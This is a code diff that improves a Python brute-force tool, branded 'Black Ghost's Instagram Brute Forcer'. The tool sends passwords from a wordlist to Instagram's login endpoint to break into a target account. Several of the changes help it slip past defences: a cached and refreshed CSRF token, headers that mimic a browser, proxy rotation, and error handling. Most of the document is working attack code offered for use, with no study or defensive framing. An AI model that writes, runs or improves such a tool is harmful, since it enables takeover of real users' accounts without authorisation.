@@ -3,10 +3,8 @@ import json
 import time
 import os
 import random
-import string
 from concurrent.futures import ThreadPoolExecutor
 
-#  non
 def welcome_message():
     logo = '''
       ██████╗ ██╗      ██████╗ ███████╗███████╗
@@ -19,7 +17,6 @@ def welcome_message():
     print(f"\033[1;31m{logo}\033[0m")
     print("\033[1;32mWelcome to Black Ghost's Instagram Brute Forcer!\033[0m")
 
-# non
 def display_sticker(message):
     stickers = {
         "username": "🧑‍💻",
@@ -39,6 +36,7 @@ class InstaBrute:
         self.password_file = password_file
         self.proxy = proxy
         self.session = requests.Session()
+        self.csrf_token = None
         self.setup_headers()
         self.passwords = self.load_passwords()
 
@@ -46,6 +44,7 @@ class InstaBrute:
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
             'Referer': 'https://www.instagram.com/',
+            'X-Requested-With': 'XMLHttpRequest',
         })
         if self.proxy:
             self.session.proxies.update({
@@ -68,15 +67,26 @@ class InstaBrute:
     def get_csrf_token(self):
         r = self.session.get('https://www.instagram.com/')
         cookies = r.cookies.get_dict()
-        return cookies.get('csrftoken', None)
+        csrf = cookies.get('csrftoken')
+        if not csrf:
+            print("[!] Couldn't fetch CSRF token.")
+        return csrf
 
     def try_login(self, password):
-        csrf_token = self.get_csrf_token()
-        if not csrf_token:
-            print("[!] CSRF token not found. Skipping this attempt.")
-            return False
+        # فقط یکبار csrf token بگیر
+        if not self.csrf_token:
+            self.csrf_token = self.get_csrf_token()
+            if not self.csrf_token:
+                print("[!] CSRF token not found. Skipping this attempt.")
+                return False
 
-        self.session.headers.update({'X-CSRFToken': csrf_token})
+        # آپدیت هدرها با csrf token
+        self.session.headers.update({
+            'X-CSRFToken': self.csrf_token,
+            'Referer': 'https://www.instagram.com/accounts/login/',
+            'X-Instagram-AJAX': '1',
+        })
+
         payload = {
             'username': self.username,
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
@@ -84,8 +94,15 @@ class InstaBrute:
             'optIntoOneTap': 'false'
         }
 
-        res = self.session.post('https://www.instagram.com/accounts/login/ajax/',
-                                data=payload, allow_redirects=True)
+        try:
+            res = self.session.post('https://www.instagram.com/accounts/login/ajax/',
+                                    data=payload, allow_redirects=True)
+        except Exception as e:
+            print(f"[!] Request failed: {e}")
+            return False
+
+        # بروز رسانی csrf token از کوکی‌ها بعد هر لاگین
+        self.csrf_token = res.cookies.get('csrftoken', self.csrf_token)
 
         try:
             data = res.json()
@@ -143,6 +160,9 @@ class InstaBrute:
     def proxy_rotation(self):
         choice = input(f"{display_sticker('proxy-rotation')} Do you want to use proxy rotation? (y/n): ").lower()
         if choice == 'y':
+            if not os.path.exists('proxy_list.txt'):
+                print("[!] Proxy list file 'proxy_list.txt' not found.")
+                return
             with open('proxy_list.txt', 'r') as f:
                 proxies = f.read().splitlines()
                 for proxy in proxies:
@@ -170,7 +190,7 @@ if __name__ == '__main__':
         delay = 3
 
     brute = InstaBrute(username, password_file='pas.txt', proxy=proxy)
-    
+
     brute.enable_multithreading()
     brute.random_user_agent()
     brute.save_results()
